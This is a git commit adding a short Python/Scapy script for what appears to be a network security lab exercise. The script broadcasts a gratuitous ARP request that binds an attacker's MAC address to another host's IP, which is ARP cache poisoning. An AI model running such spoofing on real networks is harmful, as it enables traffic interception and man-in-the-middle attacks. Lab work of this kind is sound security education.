b68aa6b477c7d34d449d52c57b3f1e9abdbe838e
Zan Ni <nizan@foxmail.com>
2024-04-12 03:27:12 -0400

    update lab3 task1

---
+++ Lab3/volumes/task1c.py
@@ -0,0 +1,15 @@
+#!/usr/bin/env python3
+from scapy.all import *
+
+IP_A='10.9.0.5'
+MAC_A='02:42:0a:09:00:05'
+IP_B='10.9.0.6'
+MAC_B='02:42:0a:09:00:06'
+MAC_M='02:42:0a:09:00:69'
+
+E = Ether(dst='ff:ff:ff:ff:ff:ff', src=MAC_M)
+A = ARP(hwsrc=MAC_M, psrc=IP_B, hwdst='ff:ff:ff:ff:ff:ff', pdst=IP_B)
+A.op = 1 # 1 for ARP request; 2 for ARP reply
+pkt = E/A
+pkt.show()
+sendp(pkt)
